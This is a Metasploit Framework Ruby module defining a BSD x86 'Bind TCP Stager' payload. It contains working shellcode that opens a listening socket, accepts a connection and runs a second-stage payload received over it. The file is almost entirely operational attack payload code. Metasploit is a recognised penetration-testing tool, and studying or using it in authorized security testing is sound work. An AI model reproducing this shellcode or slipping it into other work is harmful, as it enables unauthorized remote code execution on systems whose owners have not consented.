##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


###
#
# BindTcp
# -------
#
# BSD bind TCP stager.
#
###
module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Stager

  handler module_name: 'Msf::Handler::BindTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager',
      'Description'   => 'Listen for a connection',
      'Author'        => 'skape',
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsdi',
      'Arch'          => ARCH_X86,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 0x1f, 'n'    ],
            },
          'Payload' =>
            "\x89\xe5\x68\x00\x07\x00\xc3\xb8\x9a\x00\x00\x00\x99\x50\x89\xe6" +
            "\x31\xc0\x50\x40\x50\x40\x50\xb0\x61\xff\xd6\x52\x68\x10\x02\xbf" +
            "\xbf\x89\xe3\x6a\x10\x53\x50\x6a\x68\x58\xff\xd6\xb0\x6a\xff\xd6" +
            "\x59\x52\x52\x51\xb0\x1e\xff\xd6\x97\x6a\x03\x58\xb6\x0c\x52\x55" +
            "\x57\xff\xd6\xff\xe5"
        }
      ))
  end

end
